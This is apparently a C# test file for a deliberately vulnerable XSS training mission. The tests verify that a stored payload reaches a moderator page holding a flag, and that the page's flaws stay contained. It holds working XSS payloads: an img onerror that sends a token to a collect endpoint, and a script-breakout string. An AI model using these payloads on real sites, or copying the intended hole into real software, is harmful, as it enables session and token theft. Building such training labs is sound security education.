using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc.Testing;
using Trainer.Web.Core;

namespace Trainer.Web.Tests;

public class BlazorXssMissionTests(WebApplicationFactory<Program> factory) : MissionTestBase(factory, "blazor-xss")
{
    private string ModeratorUrl => ((IHasModeratorView)Mission).ModeratorViewUrl;

    [Fact]
    public async Task Stored_payload_reaches_the_moderator_page_which_holds_the_flag()
    {
        Mission.Reset();
        const string payload = "<img src=x onerror=\"new Image().src='/api/missions/blazor-xss/collect?t='+modToken\">";
        (await Client().PostAsJsonAsync($"{Api}/comments", new { text = payload })).EnsureSuccessStatusCode();

        var html = await Client(null).GetStringAsync(ModeratorUrl);

        Assert.Contains($"window.modToken = \"{Flag}\"", html);
        Assert.Contains("innerHTML", html);
        Assert.Contains("onerror", html);                          // stored and rendered
        Assert.DoesNotContain("<img src=x", html);                 // only inside the JSON, escaped
    }

    [Fact]
    public async Task Comments_cannot_break_out_of_the_data_script()
    {
        Mission.Reset();
        await Client().PostAsJsonAsync($"{Api}/comments", new { text = "</script><script>alert(1)</script>" });

        var html = await Client(null).GetStringAsync(ModeratorUrl);

        Assert.Equal(2, html.Split("</script>").Length - 1);       // only the page's own two scripts end
    }

    [Fact]
    public async Task Collect_records_queries_for_the_listening_post()
    {
        Mission.Reset();
        var anonymous = Client(null);
        Assert.Equal(HttpStatusCode.NoContent, (await anonymous.GetAsync($"{Api}/collect?t={Uri.EscapeDataString(Flag)}")).StatusCode);

        var collected = await anonymous.GetFromJsonAsync<JsonElement[]>($"{Api}/collected");
        Assert.Equal(Flag, collected!.Single().GetProperty("query").GetProperty("t").GetString());
    }

    [Fact]
    public async Task Moderator_page_needs_the_key()
    {
        Assert.Equal(HttpStatusCode.Forbidden, (await Client().GetAsync($"{Api}/moderator")).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, (await Client().GetAsync($"{Api}/moderator?key=guess")).StatusCode);
    }

    [Fact]
    public async Task Normal_comments_and_reset_work()
    {
        var client = Client();
        await client.PostAsJsonAsync($"{Api}/comments", new { text = "Hello <b>Ten Forward</b>" });
        Mission.Reset();

        var comments = await client.GetFromJsonAsync<JsonElement[]>($"{Api}/comments");
        Assert.Equal(5, comments!.Length);
        Assert.Equal(HttpStatusCode.Unauthorized, (await Client(null).PostAsJsonAsync($"{Api}/comments", new { text = "x" })).StatusCode);
    }

    [Fact]
    public async Task Mission_page_shows_the_sandboxed_moderator_view()
    {
        var html = await Factory.WithFreePlay().CreateClient().GetStringAsync("/missions/blazor-xss");

        Assert.Contains("sandbox=\"allow-scripts\"", html);
    }
}
